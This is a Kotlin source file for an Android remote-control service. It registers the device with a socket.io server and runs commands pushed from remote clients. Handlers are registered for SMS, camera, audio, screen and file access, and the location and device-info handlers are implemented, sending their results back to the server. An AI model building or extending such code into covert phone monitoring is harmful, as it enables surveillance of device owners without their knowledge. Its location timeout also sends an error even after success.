package com.remote.system

import android.Manifest
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.pm.ServiceInfo
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.location.Location
import android.location.LocationListener
import android.location.LocationManager
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.util.Log
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import androidx.localbroadcastmanager.content.LocalBroadcastManager
import org.json.JSONException
import org.json.JSONObject
import java.net.URISyntaxException
import io.socket.client.IO
import io.socket.client.Socket
import kotlin.math.min
import kotlin.math.pow

// Define the CommandHandler interface
interface CommandHandler {
    fun execute(params: JSONObject, clientSocketId: String, socket: Socket)
}

class RemoteControlService : Service() {
    companion object {
        private const val TAG = "RemoteControlService"
        private const val SERVER_URL = "http://10.0.2.2:3000/" // For Android emulator to reach localhost
        // For real device use: "http://YOUR_LOCAL_IP:3000/"
        // For production use: "https://remote-system.onrender.com/"
        private const val NOTIFICATION_ID = 1
        private const val CHANNEL_ID = "RemoteServiceChannel"
        private const val MAX_RETRY_DELAY = 30000L // 30 seconds max
        private const val INITIAL_RETRY_DELAY = 1000L // 1 second
        private const val CONNECTION_TIMEOUT = 15000L // 15 seconds
    }

    private var socket: Socket? = null
    private var deviceId: String? = null
    private val commandHandlers = HashMap<String, CommandHandler>()
    
    // Retry logic variables
    private var retryCount = 0
    private var currentRetryDelay = INITIAL_RETRY_DELAY
    private var isConnecting = false
    private var isDestroyed = false
    
    // Handlers for retry logic
    private val mainHandler = Handler(Looper.getMainLooper())
    private val retryHandler = Handler(Looper.getMainLooper())

    override fun onCreate() {
        super.onCreate()
        Log.d(TAG, "Service onCreate called")
        initializeCommandHandlers()
        createNotificationChannel()

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            startForeground(NOTIFICATION_ID, createNotification(getString(R.string.service_starting)), ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
        } else {
            startForeground(NOTIFICATION_ID, createNotification(getString(R.string.service_starting)))
        }

        broadcastStatus(getString(R.string.service_starting), "")
        connectToServer()
    }

    private fun initializeCommandHandlers() {
        try {
            commandHandlers["get_device_info"] = DeviceInfoCommand()
            commandHandlers["get_app_list"] = AppListCommand(this)
            commandHandlers["get_location"] = LocationCommand()
            commandHandlers["get_wifi_info"] = WiFiInfoCommand(this)
            commandHandlers["get_datetime"] = DateTimeCommand(this)
            commandHandlers["launch_app"] = LaunchAppCommand(this)
            commandHandlers["get_sms"] = SmsCommand(this)
            commandHandlers["file_manager"] = FileManagerCommand(this)
            commandHandlers["camera"] = CameraCommand(this)
            commandHandlers["audio"] = AudioCommand(this)
            commandHandlers["screen"] = ScreenCommand(this)
            
            Log.d(TAG, "Command handlers initialized successfully")
        } catch (e: Exception) {
            Log.e(TAG, "Error initializing command handlers", e)
            broadcastStatus("Error initializing handlers", e.message ?: "Unknown error")
        }
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "Remote Service Channel",
                NotificationManager.IMPORTANCE_LOW
            )
            channel.description = "Channel for Remote Control Service"
            channel.setShowBadge(false)
            channel.enableLights(false)
            channel.enableVibration(false)

            val manager = getSystemService(NotificationManager::class.java)
            manager?.createNotificationChannel(channel)
        }
    }

    private fun createNotification(statusText: String): Notification {
        val builder = NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Remote Control Service")
            .setContentText(statusText)
            .setSmallIcon(android.R.drawable.ic_dialog_info)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setOngoing(true)

        return builder.build()
    }

    private fun updateNotification(statusText: String) {
        val notification = createNotification(statusText)
        val notificationManager = getSystemService(NotificationManager::class.java)
        notificationManager?.notify(NOTIFICATION_ID, notification)
    }

    private fun broadcastStatus(status: String, error: String = "") {
        try {
            val intent = Intent(MainActivity.CONNECTION_STATUS_ACTION)
            intent.putExtra(MainActivity.STATUS_KEY, status)
            intent.putExtra(MainActivity.ERROR_KEY, error)
            LocalBroadcastManager.getInstance(this).sendBroadcast(intent)
            
            // Also update notification
            updateNotification(status)
            
            Log.d(TAG, "Status broadcast: $status ${if (error.isNotEmpty()) "Error: $error" else ""}")
        } catch (e: Exception) {
            Log.e(TAG, "Error broadcasting status", e)
        }
    }

    private fun isNetworkAvailable(): Boolean {
        return try {
            val connectivityManager = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                val network = connectivityManager.activeNetwork ?: return false
                val capabilities = connectivityManager.getNetworkCapabilities(network) ?: return false
                capabilities.hasCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
            } else {
                @Suppress("DEPRECATION")
                val networkInfo = connectivityManager.activeNetworkInfo
                networkInfo?.isConnected == true
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error checking network availability", e)
            false
        }
    }

    private fun connectToServer() {
        if (isDestroyed || isConnecting) {
            Log.d(TAG, "Skipping connection attempt - service destroyed or already connecting")
            return
        }

        if (!isNetworkAvailable()) {
            Log.w(TAG, "No network available, scheduling retry")
            broadcastStatus("No network connection", "Waiting for network...")
            scheduleRetry("No network available")
            return
        }

        isConnecting = true
        broadcastStatus("Connecting to server...", "")
        
        try {
            // Disconnect existing socket if any
            socket?.disconnect()
            socket = null

            val options = IO.Options().apply {
                reconnection = false // We handle reconnection manually
                timeout = CONNECTION_TIMEOUT
                forceNew = true
            }

            socket = IO.socket(SERVER_URL, options)
            setupSocketListeners()
            
            Log.d(TAG, "Attempting to connect to server: $SERVER_URL")
            socket?.connect()
            
            // Set connection timeout
            mainHandler.postDelayed({
                if (isConnecting && socket?.connected() != true) {
                    Log.w(TAG, "Connection timeout reached")
                    handleConnectionError("Connection timeout")
                }
            }, CONNECTION_TIMEOUT)

        } catch (e: URISyntaxException) {
            Log.e(TAG, "Invalid server URL", e)
            handleConnectionError("Invalid server URL: ${e.message}")
        } catch (e: Exception) {
            Log.e(TAG, "Error during connection attempt", e)
            handleConnectionError("Connection error: ${e.message}")
        }
    }

    private fun setupSocketListeners() {
        socket?.apply {
            on(Socket.EVENT_CONNECT) {
                Log.d(TAG, "Successfully connected to server")
                isConnecting = false
                retryCount = 0
                currentRetryDelay = INITIAL_RETRY_DELAY
                
                broadcastStatus("Connected - Registering device...", "")
                
                // Create device info for registration
                val deviceInfo = JSONObject().apply {
                    put("name", "${Build.MANUFACTURER} ${Build.MODEL}")
                    put("type", "android")
                    put("model", Build.MODEL)
                    put("manufacturer", Build.MANUFACTURER)
                    put("android_version", Build.VERSION.RELEASE)
                    put("sdk_level", Build.VERSION.SDK_INT)
                    put("timestamp", System.currentTimeMillis())
                }
                
                emit("device_register", deviceInfo)
            }

            on("device_registered") { args ->
                try {
                    if (args.isNotEmpty() && args[0] is JSONObject) {
                        val data = args[0] as JSONObject
                        deviceId = data.getString("deviceId")
                        Log.d(TAG, "Device registered successfully with ID: $deviceId")
                        broadcastStatus("Connected and ready", "")
                    }
                } catch (e: JSONException) {
                    Log.e(TAG, "Error parsing registration data", e)
                    broadcastStatus("Registration error", e.message ?: "Failed to register device")
                }
            }

            on("device_command") { args ->
                if (args.isNotEmpty() && args[0] is JSONObject) {
                    try {
                        val data = args[0] as JSONObject
                        val command = data.getString("command")
                        val clientSocketId = data.getString("clientSocketId")
                        val params = data.optJSONObject("params") ?: JSONObject()

                        executeCommand(command, params, clientSocketId)
                    } catch (e: JSONException) {
                        Log.e(TAG, "Error parsing command data", e)
                        sendErrorResponse("invalid_command", "Failed to parse command", "", this@RemoteControlService.socket!!)
                    }
                }
            }

            on(Socket.EVENT_DISCONNECT) { args ->
                Log.w(TAG, "Disconnected from server. Reason: ${if (args.isNotEmpty()) args[0] else "unknown"}")
                isConnecting = false
                broadcastStatus("Disconnected from server", "Connection lost")
                scheduleRetry("Server disconnected")
            }

            on(Socket.EVENT_CONNECT_ERROR) { args ->
                val error = if (args.isNotEmpty()) args[0].toString() else "Unknown connection error"
                Log.e(TAG, "Socket connection error: $error")
                handleConnectionError(error)
            }
        }
    }

    private fun handleConnectionError(error: String) {
        isConnecting = false
        Log.e(TAG, "Connection failed: $error")
        broadcastStatus("Connection failed", error)
        scheduleRetry(error)
    }

    private fun scheduleRetry(reason: String) {
        if (isDestroyed) {
            Log.d(TAG, "Service destroyed, not scheduling retry")
            return
        }

        retryCount++
        val delay = min(currentRetryDelay, MAX_RETRY_DELAY)
        
        Log.d(TAG, "Scheduling retry #$retryCount in ${delay}ms. Reason: $reason")
        broadcastStatus("Retrying connection in ${delay/1000}s...", "Attempt #$retryCount")
        
        retryHandler.postDelayed({
            if (!isDestroyed) {
                Log.d(TAG, "Executing retry #$retryCount")
                connectToServer()
            }
        }, delay)
        
        // Exponential backoff with jitter
        currentRetryDelay = min((currentRetryDelay * 1.5).toLong(), MAX_RETRY_DELAY)
    }

    private fun executeCommand(command: String, params: JSONObject, clientSocketId: String) {
        Log.d(TAG, "Executing command: $command for client: $clientSocketId")

        try {
            val handler = commandHandlers[command]
            if (handler != null) {
                handler.execute(params, clientSocketId, socket!!)
            } else {
                Log.w(TAG, "Unknown command: $command")
                sendErrorResponse(command, "Command not supported", clientSocketId, socket!!)
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error executing command: $command", e)
            sendErrorResponse(command, "Command execution failed: ${e.message}", clientSocketId, socket!!)
        }
    }

    private fun sendErrorResponse(command: String, error: String, clientSocketId: String, socket: Socket) {
        try {
            val response = JSONObject().apply {
                put("success", false)
                put("error", error)
                put("command", command)
                put("clientSocketId", clientSocketId)
                put("timestamp", System.currentTimeMillis())
            }
            socket.emit("device_response", response)
        } catch (e: JSONException) {
            Log.e(TAG, "Error creating error response", e)
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Log.d(TAG, "Service onStartCommand called")
        return START_STICKY // Restart service if killed by system
    }

    override fun onBind(intent: Intent?): IBinder? {
        return null
    }

    override fun onDestroy() {
        super.onDestroy()
        Log.d(TAG, "Service onDestroy called")
        
        isDestroyed = true
        isConnecting = false
        
        // Cancel any pending retries
        retryHandler.removeCallbacksAndMessages(null)
        mainHandler.removeCallbacksAndMessages(null)
        
        // Disconnect socket
        socket?.disconnect()
        socket = null
        
        broadcastStatus("Service stopped", "")
    }

    // Helper method to check permissions
    private fun checkPermission(permission: String): Boolean {
        return ContextCompat.checkSelfPermission(this, permission) == PackageManager.PERMISSION_GRANTED
    }

    // Implementation of DeviceInfoCommand with proper error handling
    inner class DeviceInfoCommand : CommandHandler {
        override fun execute(params: JSONObject, clientSocketId: String, socket: Socket) {
            try {
                val data = JSONObject().apply {
                    put("manufacturer", Build.MANUFACTURER)
                    put("model", Build.MODEL)
                    put("device", Build.DEVICE)
                    put("android_version", Build.VERSION.RELEASE)
                    put("sdk_level", Build.VERSION.SDK_INT)
                    put("timestamp", System.currentTimeMillis())
                }

                val response = JSONObject().apply {
                    put("success", true)
                    put("data", data)
                    put("command", "get_device_info")
                    put("clientSocketId", clientSocketId)
                }

                socket.emit("device_response", response)
                Log.d(TAG, "Device info sent successfully")
                
            } catch (e: Exception) {
                Log.e(TAG, "Error getting device info", e)
                sendErrorResponse("get_device_info", "Failed to get device info: ${e.message}", clientSocketId, socket)
            }
        }
    }

    // Implementation of LocationCommand with enhanced error handling
    inner class LocationCommand : CommandHandler {
        override fun execute(params: JSONObject, clientSocketId: String, socket: Socket) {
            if (!checkPermission(Manifest.permission.ACCESS_FINE_LOCATION) &&
                !checkPermission(Manifest.permission.ACCESS_COARSE_LOCATION)) {
                
                sendErrorResponse("get_location", "Location permission not granted", clientSocketId, socket)
                return
            }

            try {
                val locationManager = getSystemService(Context.LOCATION_SERVICE) as LocationManager
                val hasGPS = locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER)
                val hasNetwork = locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER)

                if (!hasGPS && !hasNetwork) {
                    sendErrorResponse("get_location", "Location services are disabled", clientSocketId, socket)
                    return
                }

                val locationListener = object : LocationListener {
                    override fun onLocationChanged(location: Location) {
                        try {
                            val data = JSONObject().apply {
                                put("latitude", location.latitude)
                                put("longitude", location.longitude)
                                put("accuracy", location.accuracy)
                                put("provider", location.provider)
                                put("timestamp", location.time)
                            }

                            val response = JSONObject().apply {
                                put("success", true)
                                put("data", data)
                                put("command", "get_location")
                                put("clientSocketId", clientSocketId)
                            }

                            socket.emit("device_response", response)
                            Log.d(TAG, "Location sent successfully")

                            // Remove updates after getting location
                            if (checkPermission(Manifest.permission.ACCESS_FINE_LOCATION) ||
                                checkPermission(Manifest.permission.ACCESS_COARSE_LOCATION)) {
                                locationManager.removeUpdates(this)
                            }
                        } catch (e: Exception) {
                            Log.e(TAG, "Error processing location", e)
                            sendErrorResponse("get_location", "Error processing location: ${e.message}", clientSocketId, socket)
                        }
                    }

                    override fun onStatusChanged(provider: String, status: Int, extras: Bundle) {}
                    override fun onProviderEnabled(provider: String) {}
                    override fun onProviderDisabled(provider: String) {}
                }

                // Request location updates
                if (checkPermission(Manifest.permission.ACCESS_FINE_LOCATION)) {
                    locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, 0, 0f, locationListener)
                } else if (checkPermission(Manifest.permission.ACCESS_COARSE_LOCATION)) {
                    locationManager.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, 0, 0f, locationListener)
                }

                // Set timeout for location request
                mainHandler.postDelayed({
                    try {
                        locationManager.removeUpdates(locationListener)
                        sendErrorResponse("get_location", "Location request timeout", clientSocketId, socket)
                    } catch (e: Exception) {
                        Log.e(TAG, "Error removing location updates", e)
                    }
                }, 30000) // 30 second timeout

            } catch (e: Exception) {
                Log.e(TAG, "Error getting location", e)
                sendErrorResponse("get_location", "Error getting location: ${e.message}", clientSocketId, socket)
            }
        }
    }
}